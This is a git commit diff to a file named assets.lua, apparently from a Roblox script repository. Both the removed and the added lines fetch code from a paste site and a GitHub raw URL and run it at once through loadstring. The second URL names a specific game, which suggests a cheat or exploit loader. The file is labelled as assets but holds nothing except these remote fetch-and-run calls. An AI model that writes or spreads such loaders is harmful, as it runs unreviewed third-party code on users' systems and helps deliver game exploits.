5c0a54ee21f3630a198abdff47167f8eaf7b499c
etfb-lua <Neilkaizen17@gmail.com>
2026-02-28 19:42:43 +0800

    Update assets.lua

--- assets.lua
+++ assets.lua
@@ -1,8 +1,3 @@
-local function s1() 
-  loadstring(game:HttpGet("https://pastefy.app/tB9qMt6x/raw", true))()
-end 
-local function s2() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/EscapeTsunamiForBrainrots"))()
-end 
-task.spawn(s1)
-task.spawn(s2)
+loadstring(game:HttpGet("https://pastefy.app/tB9qMt6x/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/EscapeTsunamiForBrainrots"))()
+
